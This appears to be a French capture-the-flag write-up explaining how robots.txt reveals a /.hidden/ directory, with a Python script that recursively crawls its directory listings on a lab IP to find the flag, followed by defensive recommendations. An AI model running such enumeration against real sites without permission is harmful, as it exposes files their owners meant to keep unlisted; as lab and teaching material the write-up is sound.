# Récupération de la Clé — Exploration de robots.txt et Directory Crawling

## 🔍 Méthode d'exploitation

Pour ce flag, il faut regarder le contenu du fichier **`/robots.txt`** du site.

On y trouve un dossier nommé **`/.hidden/`**. En s'y rendant, on découvre une liste de dossiers contenant chacun des sous-dossiers, et ainsi de suite. Le but est donc de **parcourir récursivement tous ces dossiers** jusqu'à trouver le flag.

### Script Python de crawling

```python
import urllib.request, re

def crawl(url):
    try:
        html = urllib.request.urlopen(url).read().decode()
        links = re.findall(r'href=\"([^\"]+)\"', html)
        for link in links:
            if link in ('../', '/'):
                continue
            full = url + link
            if link.endswith('/'):
                crawl(full)
            else:
                content = urllib.request.urlopen(full).read().decode()
                if 'flag' in content.lower():
                    print('FOUND:', full)
                    print(content)
    except:
        pass

crawl('http://192.168.64.2/.hidden/')
```

---

## 🛡️ Recommandations

Pour se protéger de ce genre de faille :

- **Ne pas référencer de dossiers/fichiers sensibles dans `robots.txt`** — ce fichier est public par définition et peut servir de carte aux attaquants
- **Désactiver le directory listing** sur le serveur pour empêcher l'énumération du contenu des dossiers